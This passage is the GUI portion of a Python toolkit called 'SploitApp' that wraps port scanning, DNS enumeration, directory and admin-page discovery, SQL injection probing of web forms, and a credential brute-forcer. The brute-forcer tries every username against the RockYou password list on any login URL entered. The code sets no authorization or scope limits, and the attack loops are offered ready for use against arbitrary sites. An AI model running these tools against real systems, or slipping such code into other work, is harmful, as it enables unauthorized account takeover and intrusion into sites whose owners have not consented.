        scan_btn = ctk.CTkButton(input_frame, text="Start Port Scan",
                                 command=lambda: self.run_port_scan(target_entry, ports_entry, output_box))
        scan_btn.pack(pady=15)

        output_frame = ctk.CTkFrame(main_frame)
        output_frame.pack(fill="both", expand=True)

        output_box = ctk.CTkTextbox(output_frame, font=("Consolas", 12))
        output_box.pack(side="left", fill="both", expand=True)

        scrollbar = ctk.CTkScrollbar(output_frame, command=output_box.yview)
        scrollbar.pack(side="right", fill="y")
        output_box.configure(yscrollcommand=scrollbar.set)

    def run_port_scan(self, target_entry, ports_entry, output_box):
        output_box.delete("1.0", "end")
        target = target_entry.get().strip()
        if not target:
            output_box.insert("end", "[!] Please enter a target\n")
            return

        ports_text = ports_entry.get().strip()
        ports = None
        if ports_text:
            try:
                if "," in ports_text:
                    ports = [int(port.strip()) for port in ports_text.split(",")]
                else:
                    ports = int(ports_text)
            except ValueError:
                output_box.insert("end", "[!] Invalid port format\n")
                return

        output_box.insert("end", f"[+] Starting port scan on {target}\n")
        output_box.see("end")

        def scan_thread():
            try:
                from Web.Port_Scanner.Builder import PortScannerBuilder

                builder = PortScannerBuilder(target, ports)
                results = builder.run()

                open_ports = [r['port'] for r in results['results'] if r['status'] == 'open']

                output_box.insert("end", "[+] Scan completed!\n")
                output_box.insert("end", f"[+] Found {len(open_ports)} open ports\n\n")

                for r in results['results']:
                    if r['status'] == 'open':
                        output_box.insert("end", f"[+] Port {r['port']} - OPEN\n")

                output_box.see("end")
                self.show_notification("Port Scan Complete", f"Found {len(open_ports)} open ports on {target}")

            except Exception as e:
                output_box.insert("end", f"[!] Error: {str(e)}\n")
                output_box.see("end")
                self.show_notification("Error", f"Port scan failed: {str(e)}", True)

        threading.Thread(target=scan_thread, daemon=True).start()


    def header_analyzer(self):
        win = ctk.CTkToplevel(self)
        win.title("HTTP Header Analyzer")
        win.geometry("800x600")

        label = ctk.CTkLabel(win, text="Enter website URL:", font=("Arial", 16))
        label.pack(pady=15)

        url_entry = ctk.CTkEntry(win, width=400, placeholder_text="https://example.com", font=("Arial", 14))
        url_entry.pack(pady=10)

        output_box = ctk.CTkTextbox(win, width=750, height=400, font=("Consolas", 12))
        output_box.pack(pady=15)

        def analyze_headers():
            url = url_entry.get().strip()
            if not url:
                output_box.insert("end", "[!] Please enter a URL\n")
                return

            output_box.insert("end", f"[+] Analyzing headers for: {url}\n")

            def run_headers():
                try:
                    builder = HeaderAnalyzerBuilder(url)
                    results = builder.run()

                    if not results:
                        output_box.insert("end", "[!] No results returned\n")
                        return

                    if 'error' in results:
                        output_box.insert("end", f"[!] {results['error']}\n")
                        return

                    status_code = results.get('status_code', 'Unknown')
                    server_info = results.get('server_info', 'Unknown')
                    powered_by = results.get('powered_by', 'Unknown')

                    output_box.insert("end", f"[+] Status Code: {status_code}\n")
                    output_box.insert("end", f"[+] Server: {server_info}\n")
                    output_box.insert("end", f"[+] Powered By: {powered_by}\n\n")

                    security_analysis = results.get('security_analysis', {})
                    output_box.insert("end", "[+] Security Headers Analysis:\n")
                    for header, info in security_analysis.items():
                        status = "✅" if info.get('present') else "❌"
                        value = info.get('value') or 'Missing'
                        output_box.insert("end", f"  {status} {header}: {value}\n")

                    self.show_notification("Header Analysis Complete", f"Header analysis completed for {url}")

                except Exception as e:
                    output_box.insert("end", f"[!] Unexpected Error: {str(e)}\n")
                    self.show_notification("Error", f"Header analysis failed: {str(e)}", True)

            threading.Thread(target=run_headers, daemon=True).start()

        analyze_btn = ctk.CTkButton(win, text="Analyze Headers", command=analyze_headers)
        analyze_btn.pack(pady=10)



    def ssl_checker(self):
        win = ctk.CTkToplevel(self)
        win.title("SSL/TLS Checker")
        win.geometry("800x600")

        label = ctk.CTkLabel(win, text="Enter website URL:", font=("Arial", 16))
        label.pack(pady=15)

        url_entry = ctk.CTkEntry(win, width=400, placeholder_text="example.com", font=("Arial", 14))
        url_entry.pack(pady=10)

        output_box = ctk.CTkTextbox(win, width=750, height=400, font=("Consolas", 12))
        output_box.pack(pady=15)

        def check_ssl():
            hostname = url_entry.get().strip()
            if not hostname:
                output_box.insert("end", "[!] Please enter a hostname\n")
                return

            output_box.insert("end", f"[+] Checking SSL/TLS for: {hostname}\n")

            def run_ssl():
                try:
                    builder = SSLCheckerBuilder(hostname)
                    results = builder.run()

                    if not results:
                        output_box.insert("end", "[!] No results returned\n")
                        return

                    ssl_version = results.get('ssl_version', 'None')
                    output_box.insert("end", f"[+] SSL Version: {ssl_version}\n")

                    cipher = results.get('cipher')
                    cipher_text = cipher[0] if cipher else 'None'
                    output_box.insert("end", f"[+] Cipher: {cipher_text}\n")

                    valid = results.get('valid', False)
                    output_box.insert("end", f"[+] Certificate Valid: {valid}\n")

                    if valid and results.get('certificate'):
                        cert = results['certificate']
                        output_box.insert("end", f"[+] Issuer: {cert.get('issuer', 'Unknown')}\n")
                        output_box.insert("end", f"[+] Valid From: {cert.get('valid_from', 'Unknown')}\n")
                        output_box.insert("end", f"[+] Valid To: {cert.get('valid_to', 'Unknown')}\n")
                        output_box.insert("end", f"[+] Days Until Expiry: {cert.get('days_until_expiry', 'Unknown')}\n")
                    elif not valid and results.get('error'):
                        output_box.insert("end", f"[!] Error: {results['error']}\n")

                    self.show_notification("SSL Check Complete", f"SSL check completed for {hostname}")

                except Exception as e:
                    output_box.insert("end", f"[!] Unexpected Error: {str(e)}\n")
                    self.show_notification("Error", f"SSL check failed: {str(e)}", True)

            threading.Thread(target=run_ssl, daemon=True).start()

        check_btn = ctk.CTkButton(win, text="Check SSL", command=check_ssl)
        check_btn.pack(pady=10)



    def dns_enum(self):
        win = ctk.CTkToplevel(self)
        win.title("DNS Enumeration")
        win.geometry("800x600")

        label = ctk.CTkLabel(win, text="Enter domain:", font=("Arial", 16))
        label.pack(pady=15)

        domain_entry = ctk.CTkEntry(win, width=400, placeholder_text="example.com", font=("Arial", 14))
        domain_entry.pack(pady=10)

        output_box = ctk.CTkTextbox(win, width=750, height=400, font=("Consolas", 12))
        output_box.pack(pady=15)

        def enumerate_dns():
            domain = domain_entry.get().strip()
            if not domain:
                output_box.insert("end", "[!] Please enter a domain\n")
                return

            output_box.insert("end", f"[+] Enumerating DNS for: {domain}\n")

            def run_dns():
                try:
                    builder = DNSEnumerationBuilder(domain)
                    results = builder.run()

                    if not results:
                        output_box.insert("end", "[!] No results returned\n")
                        return

                    if 'error' in results:
                        output_box.insert("end", f"[!] {results['error']}\n")
                        return

                    for record_type in ['a_records', 'aaaa_records', 'mx_records', 'ns_records', 'txt_records',
                                        'cname_records', 'soa_record', 'ptr_records', 'srv_records']:
                        value = results.get(record_type)
                        if isinstance(value, list) or isinstance(value, dict):
                            value_text = ', '.join([str(v) for v in value]) if value else 'None'
                        else:
                            value_text = str(value) if value else 'None'
                        output_box.insert("end", f"[+] {record_type.replace('_', ' ').upper()}: {value_text}\n")

                    self.show_notification("DNS Enumeration Complete", f"DNS enumeration completed for {domain}")

                except Exception as e:
                    output_box.insert("end", f"[!] Unexpected Error: {str(e)}\n")
                    self.show_notification("Error", f"DNS enumeration failed: {str(e)}", True)

            threading.Thread(target=run_dns, daemon=True).start()

        enum_btn = ctk.CTkButton(win, text="Enumerate DNS", command=enumerate_dns)
        enum_btn.pack(pady=10)



    def web_test_window(self):
        win = ctk.CTkToplevel(self)
        win.title("Web Security Test - SQL Injection")
        win.geometry("850x650")

        label = ctk.CTkLabel(win, text="Enter the website URL:", font=("Arial", 16))
        label.pack(pady=10)

        url_entry = ctk.CTkEntry(win, width=500, placeholder_text="https://example.com", font=("Arial", 14))
        url_entry.pack(pady=10)

        output_frame = ctk.CTkFrame(win)
        output_frame.pack(pady=20, fill="both", expand=True)

        output_box = ctk.CTkTextbox(output_frame, width=800, height=450, font=("Consolas", 14))
        output_box.pack(side="left", fill="both", expand=True)

        scrollbar = ctk.CTkScrollbar(output_frame, command=output_box.yview)
        scrollbar.pack(side="right", fill="y")
        output_box.configure(yscrollcommand=scrollbar.set)

        def start_test():
            def run_test():
                url = url_entry.get().strip()
                if not url:
                    output_box.insert("end", "[!] Please enter a URL\n")
                    output_box.update()
                    return

                payload_file = os.path.join("SQL", "Payloads.txt")
                sql_errors_file = os.path.join("SQL", "sql_errors.txt")

                try:
                    with open(payload_file, "r", encoding="utf-8") as f:
                        payloads = [line.strip() for line in f if line.strip()]
                    sql_errors = load_sql_errors(sql_errors_file)
                except Exception as e:
                    output_box.insert("end", f"[!] Error loading files: {e}\n")
                    output_box.update()
                    self.show_notification("Error", f"Error loading files: {e}", True)
                    return

                output_box.insert("end", f"[+] Loaded {len(payloads)} payload(s)\n")
                output_box.insert("end", f"[+] Loaded {len(sql_errors)} SQL error patterns\n")
                output_box.update()

                forms = find_forms(url, debug=False)
                output_box.insert("end", f"[+] Found {len(forms)} form(s)\n\n")
                output_box.update()

                vulnerabilities_found = 0
                for form in forms:
                    for payload in payloads:
                        found, error = test_form(form, payload, sql_errors, debug=False)
                        if found:
                            output_box.insert("end",
                                              f"[!!!] Form #{form['form_number']} at {form['action']} is vulnerable\n")
                            output_box.insert("end", f"     Payload: {payload}\n")
                            output_box.insert("end", f"     Error: {error}\n\n")
                            vulnerabilities_found += 1
                        else:
                            output_box.insert("end", f"[*] No SQLi detected with payload: {payload}\n")
                        output_box.update()

                if vulnerabilities_found > 0:
                    self.show_notification("Web Security Test Complete",
                                           f"Found {vulnerabilities_found} vulnerabilities!")
                else:
                    self.show_notification("Web Security Test Complete", "No vulnerabilities found.")

            threading.Thread(target=run_test, daemon=True).start()

        start_btn = ctk.CTkButton(win, text="Start Test", **self.button_style, command=start_test)
        start_btn.pack(pady=10)



    def subdir_window(self):
        win = ctk.CTkToplevel(self)
        win.title("Subdirectory Finder")
        win.geometry("850x650")

        label = ctk.CTkLabel(win, text="Enter Base URL:", font=("Arial", 16))
        label.pack(pady=10)

        url_entry = ctk.CTkEntry(win, width=500, placeholder_text="https://example.com/", font=("Arial", 14))
        url_entry.pack(pady=10)

        output_frame = ctk.CTkFrame(win)
        output_frame.pack(pady=20, fill="both", expand=True)

        output_box = ctk.CTkTextbox(output_frame, width=800, height=450, font=("Consolas", 14))
        output_box.pack(side="left", fill="both", expand=True)

        scrollbar = ctk.CTkScrollbar(output_frame, command=output_box.yview)
        scrollbar.pack(side="right", fill="y")
        output_box.configure(yscrollcommand=scrollbar.set)

        def start_subfinder():
            def run_subfinder():
                base_url = url_entry.get().strip()
                if not base_url:
                    output_box.insert("end", "[!] Please enter a URL\n")
                    output_box.update()
                    return

                wordlist_file = os.path.join("Directory_Finder", "Hidden_urls.txt")
                output_file_path = os.path.join("Directory_Finder", "Found_Success.txt")

                try:
                    with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
                        paths = [line.strip() for line in f if line.strip()]
                except Exception as e:
                    output_box.insert("end", f"[!] Failed to load wordlist: {e}\n")
                    output_box.update()
                    self.show_notification("Error", f"Failed to load wordlist: {e}", True)
                    return

                found_count = 0
                with open(output_file_path, "w", encoding="utf-8") as output_file:
                    for path in paths:
                        final_url = base_url + path
                        try:
                            response = requests.get(final_url, timeout=5)
                            if response.status_code == 200:
                                output_box.insert("end", f"[+ ✅] Found: {final_url}\n")
                                output_file.write(final_url + "\n")
                                found_count += 1
                            else:
                                output_box.insert("end", f"[-] {final_url} - Status {response.status_code}\n")
                        except Exception as req_err:
                            output_box.insert("end", f"[-] Error fetching {final_url} => {req_err}\n")
                        output_box.update()
                        time.sleep(0.2)

                self.show_notification("Subdirectory Scan Complete", f"Found {found_count} subdirectories")

            threading.Thread(target=run_subfinder, daemon=True).start()

        start_btn = ctk.CTkButton(win, text="Start Subdirectory Scan", **self.button_style, command=start_subfinder)
        start_btn.pack(pady=10)


    def site_scan_window(self):
        win = ctk.CTkToplevel(self)
        win.title("Full Site Scanner")
        win.geometry("900x700")

        label = ctk.CTkLabel(win, text="Enter Site URL:", font=("Arial", 16))
        label.pack(pady=10)

        url_entry = ctk.CTkEntry(win, width=500, placeholder_text="https://example.com/", font=("Arial", 14))
        url_entry.pack(pady=10)

        output_frame = ctk.CTkFrame(win)
        output_frame.pack(pady=10, fill="both", expand=True)

        output_box = ctk.CTkTextbox(output_frame, width=850, height=500, font=("Consolas", 14))
        output_box.pack(side="left", fill="both", expand=True)

        scrollbar = ctk.CTkScrollbar(output_frame, command=output_box.yview)
        scrollbar.pack(side="right", fill="y")
        output_box.configure(yscrollcommand=scrollbar.set)

        sys.stdout = TextRedirector(output_box)

        def start_scan():
            def run_scan():
                url = url_entry.get().strip()
                if not url:
                    print("[!] Please enter a URL\n")
                    return

                scanner = SiteScanner(url)
                print(f"[+] Starting full scan on {url}\n")
                try:
                    results = scanner.run_all()
                except Exception as e:
                    print(f"[!] Error during scan: {e}\n")
                    self.show_notification("Error", f"Site scan failed: {e}", True)
                    return

                print("[+] Scan completed!\n")

                for section, data in results.items():
                    print(f"\n--- {section.upper()} ---")
                    pretty_print(data)

                self.show_notification("Site Scan Complete", f"Full site scan completed for {url}")

            threading.Thread(target=run_scan, daemon=True).start()

        start_btn = ctk.CTkButton(win, text="Start Full Scan", **self.button_style, command=start_scan)
        start_btn.pack(pady=10)


    def brute_force_window(self):
        win = ctk.CTkToplevel(self)
        win.title("Brute Force Login Simulator")
        win.geometry("850x650")

        url_entry = ctk.CTkEntry(win, width=500, placeholder_text="https://example.com/login")
        url_entry.pack(pady=10)

        output_box = ctk.CTkTextbox(win, font=("Consolas", 12))
        output_box.pack(fill="both", expand=True)

        sys.stdout = TextRedirector(output_box)

        stop_flag = {"stop": False}

        def start_brute_force():
            stop_flag["stop"] = False

            def run():
                url = url_entry.get().strip()
                if not url:
                    output_box.insert("end", "[!] Please enter a URL\n")
                    output_box.update()
                    return

                usernames_file = os.path.join("BF_Files", "Usernames.txt")
                passwords_file = os.path.join("BF_Files", "RockYou.txt")

                try:
                    with open(usernames_file, "r", encoding="latin-1", errors="ignore") as f:
                        usernames = [line.strip() for line in f if line.strip()]
                except Exception as e:
                    output_box.insert("end", f"[!] Failed to load usernames: {e}\n")
                    output_box.update()
                    self.show_notification("Error", f"Failed to load usernames: {e}", True)
                    return

                try:
                    with open(passwords_file, "r", encoding="latin-1", errors="ignore") as f:
                        passwords = [line.strip() for line in f if line.strip()]
                except Exception as e:
                    output_box.insert("end", f"[!] Failed to load passwords: {e}\n")
                    output_box.update()
                    self.show_notification("Error", f"Failed to load passwords: {e}", True)
                    return

                if not usernames or not passwords:
                    output_box.insert("end", "[!] Username or password list is empty!\n")
                    output_box.update()
                    return

                print("[INFO] Extracting form fields...")
                form_data = extract_form_fields(url, save_to="BF_Files/login_form.json")
                print("[INFO] Form extracted ✅")
                print(form_data)

                session = requests.Session()

                for user in usernames:
                    for pwd in passwords:
                        if stop_flag["stop"]:
                            print("[!] Brute force stopped by user\n")
                            return
                        print(f"\n[INFO] Trying {user}:{pwd} ...")
                        response = Action.attempt_login(session, form_data, user, pwd)
                        if Action.check_success(response, form_data):
                            print(f"\n✅ Login successful: {user}:{pwd}")
                            self.show_notification("Brute Force Success", f"Login successful: {user}:{pwd}")
                            return
                        else:
                            print("❌ Login failed")
                        time.sleep(0.11)

                self.show_notification("Brute Force Complete",
                                       "Brute force attack completed. No valid credentials found.")

            threading.Thread(target=run, daemon=True).start()

        def stop_brute_force():
            stop_flag["stop"] = True
            print("[!] Stop requested. Waiting for current attempt to finish...\n")

        start_btn = ctk.CTkButton(win, text="Start Brute Force", command=start_brute_force)
        start_btn.pack(pady=5)

        stop_btn = ctk.CTkButton(win, text="Stop", command=stop_brute_force, fg_color="#FF0000", hover_color="#FF5555")
        stop_btn.pack(pady=5)


    def admin_finder_window(self):
        win = ctk.CTkToplevel(self)
        win.title("Admin Finder")
        win.geometry("850x650")

        self.admin_url_entry = ctk.CTkEntry(win, width=500, placeholder_text="https://example.com")
        self.admin_url_entry.pack(pady=10)

        self.admin_output_box = ctk.CTkTextbox(win, font=("Consolas", 12))
        self.admin_output_box.pack(fill="both", expand=True)

        sys.stdout = TextRedirector(self.admin_output_box)

        self.admin_scan_stop_flag = {"stop": False}

        def start_admin_scan():
            self.admin_scan_stop_flag["stop"] = False
            url = self.admin_url_entry.get().strip()
            if not url:
                self.admin_output_box.insert("end", "[!] Please enter a URL\n")
                return

            def run_scan():
                try:
                    BuilderModule.Find_Admin(stop_flag=self.admin_scan_stop_flag, base_url=url)
                    self.show_notification("Admin Finder Complete", "Admin page search completed")
                except Exception as e:
                    print(f"[!] Error: {e}")
                    self.show_notification("Error", f"Admin finder failed: {e}", True)

            threading.Thread(target=run_scan, daemon=True).start()

        def stop_admin_scan():
            self.admin_scan_stop_flag["stop"] = True
            print("[!] Stop requested. Waiting for current attempt to finish...\n")

        start_btn = ctk.CTkButton(win, text="Start Scan", command=start_admin_scan)
        start_btn.pack(pady=5)

        stop_btn = ctk.CTkButton(win, text="Stop", command=stop_admin_scan, fg_color="#FF0000", hover_color="#FF5555")
        stop_btn.pack(pady=5)



    def site_scanner_window(self):
        win = ctk.CTkToplevel(self)
        win.title("Full Site Scanner")
        win.geometry("100x790")

        self.site_url_entry = ctk.CTkEntry(win, width=500, placeholder_text="https://example.com/")
        self.site_url_entry.pack(pady=10)

        self.site_output_box = ctk.CTkTextbox(win, font=("Consolas", 12))
        self.site_output_box.pack(fill="both", expand=True)

        sys.stdout = TextRedirector(self.site_output_box)

        self.site_scan_stop_flag = {"stop": False}

        def start_site_scan():
            self.site_scan_stop_flag["stop"] = False
            url = self.site_url_entry.get().strip()
            if not url:
                self.site_output_box.insert("end", "[!] Please enter a URL\n")
                return

            def run_scan():
                import Web.Gain_information.Builder as BuilderModule
                try:
                    scanner = BuilderModule.SiteScanner(url)
                    results = scanner.run_all()
                    if self.site_scan_stop_flag["stop"]:
                        print("[!] Scan stopped by user\n")
                        return

                    print("\n" + "=" * 60)
                    print("        🌐 FULL SITE SCAN RESULTS 🌐")
                    print("=" * 60)
                    for section, data in results.items():
                        if self.site_scan_stop_flag["stop"]:
                            print("[!] Scan stopped by user\n")
                            return
                        print(f"\n--- {section.upper()} ---")
                        BuilderModule.pretty_print(data)
                    print("\n" + "=" * 60)

                    with open("scan_results.txt", "w", encoding="utf-8") as f:
                        f.write("=" * 60 + "\n")
                        f.write("        🌐 FULL SITE SCAN RESULTS 🌐\n")
                        f.write("=" * 60 + "\n")
                        for section, data in results.items():
                            f.write(f"\n--- {section.upper()} ---\n")
                            BuilderModule.pretty_print(data, file=f)
                        f.write("\n" + "=" * 60 + "\n")

                    self.show_notification("Site Scan Complete", f"Deep site scan completed for {url}")

                except Exception as e:
                    print(f"[!] Error during scan: {e}")
                    self.show_notification("Error", f"Site scan failed: {e}", True)

            threading.Thread(target=run_scan, daemon=True).start()

        def stop_site_scan():
            self.site_scan_stop_flag["stop"] = True
            print("[!] Stop requested. Waiting for current section to finish...\n")

        start_btn = ctk.CTkButton(win, text="Start Scan", command=start_site_scan)
        start_btn.pack(pady=5)

        stop_btn = ctk.CTkButton(win, text="Stop", command=stop_site_scan, fg_color="#FF0000", hover_color="#FF5555")
        stop_btn.pack(pady=5)


if __name__ == "__main__":
    app = SploitApp()
    app.mainloop()